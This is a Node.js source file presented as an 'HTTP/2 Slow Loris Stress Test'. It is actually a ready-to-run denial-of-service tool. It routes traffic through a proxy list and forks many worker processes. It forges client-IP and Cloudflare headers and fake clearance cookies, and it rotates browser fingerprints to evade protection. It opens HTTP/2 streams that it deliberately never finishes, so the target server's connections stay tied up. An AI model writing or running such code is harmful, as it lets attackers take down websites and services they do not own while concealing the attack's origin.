/**
 * HTTP/2 Slow Loris Stress Test
 * @author @zynos_official
 * @version 2.0.0
 */

const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fs = require("fs");
const colors = require('colors');
const os = require("os");

// Prevent crashes from failed connections
process.on("uncaughtException", () => {});
process.on("unhandledRejection", () => {});
process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;

// CLI: node blast.js target time rate thread proxyfile
if (process.argv.length < 7) {
    console.log(`@zynos_official Usage: target time rate thread proxyfile`);
    process.exit();
}

// ==================== UTILITIES ====================

function readLines(filePath) {
    return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
}

function randomIntn(min, max) {
    return Math.floor(Math.random() * (max - min) + min);
}

function randomElement(elements) {
    return elements[randomIntn(0, elements.length)];
}

function randstr(length) {
    const characters = "abcdefghijklmnopqrstuvwxyz";
    let result = "";
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return result;
}

function randstrs(length) {
    const characters = "0123456789";
    const randomBytes = crypto.randomBytes(length);
    let result = "";
    for (let i = 0; i < length; i++) {
        result += characters.charAt(randomBytes[i] % characters.length);
    }
    return result;
}

const ip_spoof = () => {
    const getRandomByte = () => Math.floor(Math.random() * 255);
    return `${getRandomByte()}.${getRandomByte()}.${getRandomByte()}.${getRandomByte()}`;
};

const spoofed = ip_spoof();

function generateRandomString(minLength, maxLength) {
    const characters = 'abcdefghijklmnopqrstuvwxyz';
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    return Array.from({ length }, () => characters[Math.floor(Math.random() * characters.length)]).join('');
}

// ==================== CONFIG ====================

const args = {
    target: process.argv[2],
    time: parseInt(process.argv[3]),
    Rate: parseInt(process.argv[4]),
    threads: parseInt(process.argv[5]),
    proxyFile: process.argv[6],
};

const parsedTarget = url.parse(args.target);
const proxies = readLines(args.proxyFile);

// ==================== HEADER POOLS ====================

const cplist = [
    "TLS_AES_128_CCM_8_SHA256",
    "TLS_AES_128_CCM_SHA256",
    "TLS_CHACHA20_POLY1305_SHA256",
    "TLS_AES_256_GCM_SHA384",
    "TLS_AES_128_GCM_SHA256"
];

const accept_header = [
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,en-US;q=0.5',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8,en;q=0.7',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/atom+xml;q=0.9',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/rss+xml;q=0.9',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/json;q=0.9',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/ld+json;q=0.9',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/xml-dtd;q=0.9',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/xml-external-parsed-entity;q=0.9',
    'text/html; charset=utf-8',
    'application/json, text/plain, */*',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,text/xml;q=0.9',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,text/plain;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8'
];

const lang_header = [
    'ko-KR', 'en-US', 'zh-CN', 'zh-TW', 'ja-JP', 'en-GB', 'en-AU',
    'en-GB,en-US;q=0.9,en;q=0.8', 'en-GB,en;q=0.5', 'en-CA',
    'en-UK, en, de;q=0.5', 'en-NZ', 'en-GB,en;q=0.6', 'en-ZA',
    'en-IN', 'en-PH', 'en-SG', 'en-HK', 'en-GB,en;q=0.8',
    'en-GB,en;q=0.9', ' en-GB,en;q=0.7', '*', 'en-US,en;q=0.5',
    'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'utf-8, iso-8859-1;q=0.5, *;q=0.1', 'fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5',
    'en-GB, en-US, en;q=0.9', 'de-AT, de-DE;q=0.9, en;q=0.5',
    'cs;q=0.5', 'da, en-gb;q=0.8, en;q=0.7', 'he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7',
    'en-US,en;q=0.9', 'de-CH;q=0.7', 'tr', 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2'
];

const encoding_header = [
    '*', '*/*', 'gzip', 'gzip, deflate, br', 'compress, gzip',
    'deflate, gzip', 'gzip, identity', 'gzip, deflate', 'br',
    'br;q=1.0, gzip;q=0.8, *;q=0.1', 'gzip;q=1.0, identity; q=0.5, *;q=0',
    'gzip, deflate, br;q=1.0, identity;q=0.5, *;q=0.25',
    'compress;q=0.5, gzip;q=1.0', 'identity', 'gzip, compress',
    'compress, deflate', 'compress', 'gzip, deflate, br', 'deflate',
    'gzip, deflate, lzma, sdch', 'deflate'
];

const control_header = [
    'max-age=604800', 'proxy-revalidate', 'public, max-age=0',
    'max-age=315360000', 'public, max-age=86400, stale-while-revalidate=604800, stale-if-error=604800',
    's-maxage=604800', 'max-stale', 'public, immutable, max-age=31536000',
    'must-revalidate', 'private, max-age=0, no-store, no-cache, must-revalidate, post-check=0, pre-check=0',
    'max-age=31536000,public,immutable', 'max-age=31536000,public',
    'min-fresh', 'private', 'public', 's-maxage', 'no-cache',
    'no-cache, no-transform', 'max-age=2592000', 'no-store',
    'no-transform', 'max-age=31557600', 'stale-if-error',
    'only-if-cached', 'max-age=0'
];

const nm = ["110.0.0.0", "111.0.0.0", "112.0.0.0", "113.0.0.0", "114.0.0.0", "115.0.0.0", "116.0.0.0", "117.0.0.0", "118.0.0.0", "119.0.0.0"];
const nmx = ["120.0", "119.0", "118.0", "117.0", "116.0", "115.0", "114.0", "113.0", "112.0", "111.0"];
const nmx1 = ["105.0.0.0", "104.0.0.0", "103.0.0.0", "102.0.0.0", "101.0.0.0", "100.0.0.0", "99.0.0.0", "98.0.0.0", "97.0.0.0"];

const sysos = [
    "Windows 1.01", "Windows 1.02", "Windows 1.03", "Windows 1.04",
    "Windows 2.01", "Windows 3.0", "Windows NT 3.1", "Windows NT 3.5",
    "Windows 95", "Windows 98", "Windows 2006", "Windows NT 4.0",
    "Windows 95 Edition", "Windows 98 Edition", "Windows Me",
    "Windows Business", "Windows XP", "Windows 7", "Windows 8",
    "Windows 10 version 1507", "Windows 10 version 1511",
    "Windows 10 version 1607", "Windows 10 version 1703"
];

const winarch = [
    "x86-16", "x86-16, IA32", "IA-32", "IA-32, Alpha, MIPS",
    "IA-32, Alpha, MIPS, PowerPC", "Itanium", "x86_64",
    "IA-32, x86-64", "IA-32, x86-64, ARM64", "x86-64, ARM64",
    "ARMv4, MIPS, SH-3", "ARMv4", "ARMv5", "ARMv7",
    "IA-32, x86-64, Itanium", "IA-32, x86-64, Itanium", "x86-64, Itanium"
];

const winch = [
    "2012 R2", "2019 R2", "2012 R2 Datacenter", "Server Blue",
    "Longhorn Server", "Whistler Server", "Shell Release",
    "Daytona", "Razzle", "HPC 2008"
];

var nm1 = nm[Math.floor(Math.random() * nm.length)];
var nm2 = sysos[Math.floor(Math.random() * sysos.length)];
var nm3 = winarch[Math.floor(Math.random() * winarch.length)];
var nm4 = nmx[Math.floor(Math.random() * nmx.length)];
var nm5 = winch[Math.floor(Math.random() * winch.length)];
var nm6 = nmx1[Math.floor(Math.random() * nmx1.length)];

const uap = [
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/133.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Edge/133.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:133.0) Gecko/20100101 Firefox/133.0",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/134.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/135.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:134.0) Gecko/20100101 Firefox/134.0",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:135.0) Gecko/20100101 Firefox/135.0",
  generateRandomString(3, 8) + "/5.0 (" + nm2 + "; " + nm5 + "; " + nm3 + ") AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + nm1 + " Safari/537.36 Edg/" + nm1,
  generateRandomString(3, 8) + "/5.0 (" + nm2 + "; " + nm5 + "; " + nm3 + "; rv:" + nm4 + ") Gecko/20100101 Firefox/" + nm4,
  generateRandomString(3, 8) + "/5.0 (" + nm2 + "; " + nm5 + "; " + nm3 + ") AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + nm1 + " Safari/537.36",
  generateRandomString(3, 8) + "/5.0 (" + nm2 + "; " + nm5 + "; " + nm3 + ")) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + nm1 + " Safari/537.36 OPR/" + nm6
];

const refers = [
    'https://www.google.com', 'https://www.facebook.com', 'https://www.twitter.com',
    'https://www.youtube.com', 'https://www.amazon.com', 'https://www.netflix.com',
    'https://www.instagram.com', 'https://www.yahoo.com', 'https://www.stackoverflow.com',
    'https://www.github.com', 'https://www.linkedin.com', 'https://www.cnn.com',
    'https://www.apple.com', 'https://www.microsoft.com', 'https://www.wikipedia.org',
    'https://www.nytimes.com', 'https://www.msn.com', 'https://www.reddit.com',
    'https://www.quora.com', 'https://www.npr.org', 'https://www.bbc.com',
    'https://www.theguardian.com', 'https://www.huffingtonpost.com', 'https://www.washingtonpost.com',
    'https://www.wsj.com', 'https://www.bloomberg.com', 'https://www.cnbc.com',
    'https://www.merriam-webster.com', 'https://www.dictionary.com', 'https://www.thedailybeast.com',
    'https://www.thedailyshow.com', 'https://www.colbertnation.com', 'https://www.nationalgeographic.com',
    'https://www.nasa.gov', 'https://www.nypl.org', 'https://www.britannica.com',
    'https://www.healthline.com', 'https://www.webmd.com', 'https://www.mayoclinic.org',
    'https://www.cdc.gov', 'https://www.nih.gov', 'https://www.medlineplus.gov',
    'https://www.cancer.gov', 'https://www.fda.gov', 'https://www.nature.com',
    'https://www.sciencemag.org', 'https://www.scientificamerican.com', 'https://www.who.int',
    'https://www.un.org', 'https://www.worldbank.org', 'https://www.imf.org',
    'https://www.wto.org', 'https://www.oecd.org', 'https://www.europa.eu',
    'https://www.nato.int', 'https://www.icrc.org', 'https://www.amnesty.org',
    'https://www.hrw.org', 'https://www.greenpeace.org', 'https://www.oxfam.org',
    'https://www.doctorswithoutborders.org', 'https://www.unicef.org', 'https://www.savethechildren.org',
    'https://www.redcross.org', 'https://www.wikipedia.org', 'https://www.wikimedia.org',
    'https://www.mozilla.org', 'https://www.apache.org', 'https://www.mysql.com',
    'https://www.php.net', 'https://www.python.org', 'https://www.ruby-lang.org',
    'https://www.jquery.com', 'https://www.reactjs.org', 'https://www.angularjs.org',
    'https://www.vuejs.org', 'https://www.bootstrap.com', 'https://www.materializecss.com',
    'https://www.sass-lang.com', 'https://www.lesscss.org', 'https://www.d3js.org',
    'https://www.highcharts.com', 'https://www.chartjs.org', 'https://www.mapbox.com',
    'https://www.mapboxgl-js.com', 'https://www.openstreetmap.org', 'https://www.mapbox.com',
    'https://www.mapboxgl-js.com', 'https://www.chartjs.org', 'https://www.highcharts.com',
    'https://www.d3js.org', 'https://www.lesscss.org', 'https://www.sass-lang.com',
    'https://www.materializecss.com', 'https://www.bootstrap.com', 'https://www.vuejs.org',
    'https://www.angularjs.org', 'https://www.reactjs.org', 'https://www.jquery.com',
    'https://www.ruby-lang.org', 'https://www.python.org', 'https://www.php.net',
    'https://www.mysql.com', 'https://www.apache.org', 'https://www.mozilla.org',
    'https://www.wikimedia.org', 'https://www.wikipedia.org', 'https://www.redcross.org',
    'https://www.savethechildren.org', 'https://www.unicef.org', 'https://www.doctorswithoutborders.org',
    'https://www.oxfam.org', 'https://www.greenpeace.org', 'https://www.hrw.org',
    'https://www.amnesty.org', 'https://www.icrc.org', 'https://www.nato.int',
    'https://www.europa.eu', 'https://www.oecd.org', 'https://www.wto.org',
    'https://www.imf.org', 'https://www.worldbank.org', 'https://www.un.org',
    'https://www.who.int', 'https://www.scientificamerican.com', 'https://www.sciencemag.org',
    'https://www.nature.com', 'https://www.fda.gov', 'https://www.cancer.gov',
    'https://www.medlineplus.gov', 'https://www.nih.gov', 'https://www.cdc.gov',
    'https://www.mayoclinic.org', 'https://www.webmd.com', 'https://www.healthline.com',
    'https://www.britannica.com', 'https://www.nypl.org', 'https://www.nasa.gov',
    'https://www.nationalgeographic.com', 'https://www.colbertnation.com', 'https://www.thedailyshow.com',
    'https://www.thedailybeast.com', 'https://www.dictionary.com', 'https://www.merriam-webster.com',
    'https://www.cnbc.com', 'https://www.bloomberg.com', 'https://www.wsj.com',
    'https://www.washingtonpost.com', 'https://www.huffingtonpost.com', 'https://www.theguardian.com',
    'https://www.bbc.com', 'https://www.npr.org', 'https://www.quora.com',
    'https://www.reddit.com', 'https://www.msn.com', 'https://www.nytimes.com',
    'https://www.wikipedia.org', 'https://www.microsoft.com', 'https://www.apple.com',
    'https://www.cnn.com', 'https://www.linkedin.com', 'https://www.github.com',
    'https://www.stackoverflow.com', 'https://www.yahoo.com', 'https://www.instagram.com',
    'https://www.netflix.com', 'https://www.amazon.com', 'https://www.youtube.com',
    'https://www.twitter.com', 'https://www.facebook.com', 'https://www.google.com'
];

const platformd = ["Windows", "Linux", "Android", "iOS", "Mac OS", "iPadOS", "BlackBerry OS", "Firefox OS"];
const dest = ['document', 'image', 'embed', 'empty', 'frame'];
const uaa = [
    '"Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
    '"Google Chrome";v="118", "Chromium";v="118", "Not?A_Brand";v="99"',
    '"Google Chrome";v="117", "Chromium";v="117", "Not?A_Brand";v="16"',
    '"Google Chrome";v="116", "Chromium";v="116", "Not?A_Brand";v="8"',
    '"Google Chrome";v="115", "Chromium";v="115", "Not?A_Brand";v="99"',
    '"Google Chrome";v="118", "Chromium";v="118", "Not?A_Brand";v="24"',
    '"Google Chrome";v="117", "Chromium";v="117", "Not?A_Brand";v="24"'
];
const site = ['cross-site', 'same-origin', 'same-site', 'none'];

const cf_ray_prefixes = ["8a0a092ad9d940b0", "8a0a092ad9d940b1", "8a0a092ad9d940b2"];
const cf_ray_locations = ['SIN', 'JAK', 'CGK', 'LAX', 'FRA', 'LHR'];

const countries = [
    "ID", "SG", "MY", "PH", "TH", "VN", "CN", "JP", "KR", "IN",
    "GB", "DE", "FR", "IT", "ES", "NL", "SE", "NO", "DK", "FI",
    "PL", "CZ", "HU", "AT", "CH", "BE", "PT", "IE", "GR", "RU",
    "US", "CA", "MX", "BR", "AR", "CL", "CO", "PE", "VE", "EC",
    "ZA", "NG", "EG", "KE", "MA", "DZ", "TN", "GH", "AU", "NZ",
];

function generateCFRay() {
    const prefix = randomElement(cf_ray_prefixes);
    const loc = randomElement(cf_ray_locations);
    return `${prefix}-${loc}`;
}

// Random header values
var cipper = cplist[Math.floor(Math.random() * cplist.length)];
var platformx = platformd[Math.floor(Math.random() * platformd.length)];
var uaas = uaa[Math.floor(Math.random() * uaa.length)];
var uap1 = uap[Math.floor(Math.random() * uap.length)];
var dest1 = dest[Math.floor(Math.random() * dest.length)];
var site1 = site[Math.floor(Math.random() * site.length)];
var accept = accept_header[Math.floor(Math.random() * accept_header.length)];
var Ref = refers[Math.floor(Math.random() * refers.length)];
var lang = lang_header[Math.floor(Math.random() * lang_header.length)];
var encoding = encoding_header[Math.floor(Math.random() * encoding_header.length)];
var control = control_header[Math.floor(Math.random() * control_header.length)];

// ==================== SPOOF HEADERS ====================

const spoofHeaders = [
    { "X-Forwarded-For": ip_spoof() },
    { "X-Forwarded-Host": parsedTarget.host },
    { "X-Forwarded-Scheme": "https" },
    { "X-Real-IP": ip_spoof() },
    { "X-Remote-IP": ip_spoof() },
    { "X-Remote-Addr": ip_spoof() },
    { "X-Client-IP": ip_spoof() },
    { "X-Originating-IP": ip_spoof() },
    { "X-Host": parsedTarget.host },
    { "CF-Connecting-IP": ip_spoof() },
    { "CF-Ray": generateCFRay() },
    { "CF-IPCountry": randomElement(countries) },
    { "True-Client-IP": ip_spoof() },
    { "CDN-Loop": "cloudflare" },
    { "CF-Visitor": '{"scheme":"https"}' },
    { "CF-Worker": "true" },
    { "X-Original-URL": "/" + generateRandomString(5, 15) + "?" + generateRandomString(3, 8) + "=" + generateRandomString(4, 10) },
    { "X-Cache-Status": "HIT" },
    { "source-ip": randstr(5) }
];

const rateHeaders = [
    { "cookie": "cf-clearance=" + generateRandomString(16, 64) },
    { "origin": "https://" + parsedTarget.host + "/" },
    { "x-requested-with": "XMLHttpRequest" },
    { "cache-control": "private" },
    { "Expect-CT": "99-OK" },
    { "accept-char": "UTF-8" },
    { "Geo-Location": "UNKNOWN" },
    { "Width": "1920" },
    { "devxice-memory": "0.3" },
    { "Maxw-Forwardsp": "5" },
    { "prawgmap": "no-cache" }
];

// ==================== PROXY CONNECTION ====================

class NetSocket {
    constructor() {}

    async HTTP(options, callback) {
        const payload = `CONNECT ${options.address}:443 HTTP/1.1\r\nHost: ${options.address}:443\r\nConnection: Keep-Alive\r\n\r\n`;
        const buffer = Buffer.from(payload);

        const connection = await net.connect({
            host: options.host,
            port: options.port
        });

        connection.setTimeout(options.timeout * 1000);
        connection.setKeepAlive(true, 120000);

        connection.on("connect", () => {
            connection.write(buffer);
        });

        connection.on("data", chunk => {
            const response = chunk.toString("utf-8");
            if (!response.includes("HTTP/1.1 200")) {
                connection.destroy();
                return callback(undefined, "proxy connection failed");
            }
            return callback(connection, undefined);
        });

        connection.on("timeout", () => {
            connection.destroy();
            return callback(undefined, "timeout");
        });

        connection.on("error", (err) => {
            connection.destroy();
            return callback(undefined, err.message);
        });
    }
}

const Socker = new NetSocket();

// ==================== HEADERS ====================

const headers = {
    ":method": "GET",
    ":authority": parsedTarget.host,
    ":scheme": "https",
    ":path": (parsedTarget.path || "/") + "?" + randstr(3) + "=" + generateRandomString(10, 15) + "&" + randstr(4) + "=" + randstrs(8),
    "accept": accept,
    "accept-encoding": encoding,
    "accept-language": lang,
    "cache-control": control,
    "pragma": "no-cache",
    "referer": Ref,
    "sec-ch-ua": uaas,
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": platformx,
    "sec-fetch-dest": dest1,
    "sec-fetch-mode": "navigate",
    "sec-fetch-site": site1,
    "sec-fetch-user": "?1",
    "upgrade-insecure-requests": "1",
    "user-agent": uap1,
    "cookie": "cf_clearance=" + randstr(4) + "." + randstr(20) + "." + randstr(40) + "-0.0.1 " + randstr(20) + ";_ga=" + randstr(20) + ";_gid=" + randstr(15),
    "priority": "u=0, 1",
    "cdn-loop": "cloudflare",
    "x-forwarded-proto": "https",
    "X-Forwarded-For": spoofed,
    "TE": "trailers",
    "dnt": "1",
    "x-content-type-options": "nosniff",
    "x-requested-with": "XMLHttpRequest"
};

// SLOW LORIS CORE: chunked + expect 100-continue = server holds connection
const slowHeaders = {
    "Transfer-Encoding": "chunked",
    "Content-Length": generateRandomString(500, 2000),
    "Expect": "100-continue"
};

function shuffleObject(obj) {
    const keys = Object.keys(obj);
    for (let i = keys.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [keys[i], keys[j]] = [keys[j], keys[i]];
    }
    const result = {};
    for (const key of keys) {
        result[key] = obj[key];
    }
    return result;
}

// ==================== CLUSTER MASTER ====================

const MAX_RAM_PERCENTAGE = 80;
const RESTART_DELAY = 1000;

if (cluster.isMaster) {
    console.clear();
    console.log(`SLOW LORIS MODE`.rainbow);
    console.log(`--------------------------------------------`.gray);
    console.log(`Target: `.brightYellow + process.argv[2]);
    console.log(`Time: `.brightYellow + process.argv[3]);
    console.log(`Rate: `.brightYellow + process.argv[4]);
    console.log(`Thread: `.brightYellow + process.argv[5]);
    console.log(`ProxyFile: `.brightYellow + process.argv[6]);
    console.log(`--------------------------------------------`.gray);
    console.log(`Slow Loris - Gantung Koneksi`.brightCyan);

    const restartWorkers = () => {
        for (const id in cluster.workers) {
            cluster.workers[id].kill();
        }
        console.log(`[RESTART] Restarting workers...`);
        setTimeout(() => {
            for (let i = 0; i < args.threads; i++) {
                cluster.fork();
            }
        }, RESTART_DELAY);
    };

    // Monitor RAM
    setInterval(() => {
        const totalRAM = os.totalmem();
        const usedRAM = totalRAM - os.freemem();
        const usage = (usedRAM / totalRAM) * 100;
        if (usage >= MAX_RAM_PERCENTAGE) {
            console.log(`[MEMORY] Usage: ${usage.toFixed(2)}% - Restarting...`);
            restartWorkers();
        }
    }, 5000);

    // Fork workers
    for (let i = 0; i < args.threads; i++) {
        cluster.fork();
    }

    // Auto-terminate
    setTimeout(() => {
        console.log(`[SHUTDOWN] Time limit reached. Terminating...`.red);
        process.exit(0);
    }, args.time * 1000);

} else {
    // ==================== WORKER - SLOW LORIS ATTACK ====================

    function runFlooder() {
        const proxyAddr = randomElement(proxies);
        const parsedProxy = proxyAddr.split(":");

        const proxyOptions = {
            host: parsedProxy[0],
            port: parseInt(parsedProxy[1]),
            address: parsedTarget.host + ":443",
            timeout: 30
        };

        Socker.HTTP(proxyOptions, async (connection, error) => {
            if (error) return;

            connection.setKeepAlive(true, 120000);

            const tlsOptions = {
                rejectUnauthorized: false,
                host: parsedTarget.host,
                servername: parsedTarget.host,
                socket: connection,
                ecdhCurve: "X25519:prime256v1",
                ciphers: cipper,
                secureProtocol: "TLS_method",
                ALPNProtocols: ['h2']
            };

            const tlsConn = await tls.connect(443, parsedTarget.host, tlsOptions);
            tlsConn.setKeepAlive(true, 120000);

            const client = await http2.connect(parsedTarget.href, {
                protocol: "https",
                settings: {
                    headerTableSize: 8192,
                    maxConcurrentStreams: 1000,
                    initialWindowSize: 65535,
                    maxHeaderListSize: 16384,
                    maxFrameSize: 32768,
                    enablePush: false
                },
                maxSessionMemory: 3333,
                maxDeflateDynamicTableSize: 4294967295,
                createConnection: () => tlsConn,
                socket: connection
            });

            client.settings({
                headerTableSize: 8192,
                maxConcurrentStreams: 1000,
                initialWindowSize: 65535,
                maxHeaderListSize: 16384,
                maxFrameSize: 32768,
                enablePush: false
            });

            let attackTimer;

            client.on("connect", () => {
                attackTimer = setInterval(() => {
                    const shuffledHeaders = shuffleObject({
                        ...headers,
                        ...slowHeaders,
                        ":method": "GET",
                        ":scheme": "https",
                        ":authority": parsedTarget.host,
                        ":path": (parsedTarget.path || "/") + "?" + randstr(5) + "=" + generateRandomString(15,25) + "&" + randstr(6) + "=" + randstrs(12),
                        "referer": Ref,
                        "accept-language": lang,
                        "cookie": "PHPSESSID=" + randstr(32) + ";cf-clearance=" + generateRandomString(32,64),
                        "x-forwarded-proto": "https",
                        ...randomElement(spoofHeaders),
                        ...randomElement(rateHeaders)
                    });

                    for (let i = 0; i < args.Rate; i++) {
                        const request = client.request(shuffledHeaders);
                        
                        // Server menunggu response - kita biarkan ngantung
                        request.on('response', () => {});
                        
                        // Kirim chunk terakhir dengan delay - server terus menunggu
                        const chunk = "0\r\n\r\n";
                        setTimeout(() => {
                            request.write(chunk);
                            // KRITIKAL: request.end() TIDAK dipanggil!
                            // Koneksi menggantung selamanya
                        }, Math.floor(Math.random() * 5000) + 1000);
                    }
                }, Math.floor(Math.random() * 3000) + 2000);
            });

            client.on("close", () => {
                clearInterval(attackTimer);
                client.destroy();
                connection.destroy();
            });
        });
    }

    setInterval(runFlooder);
}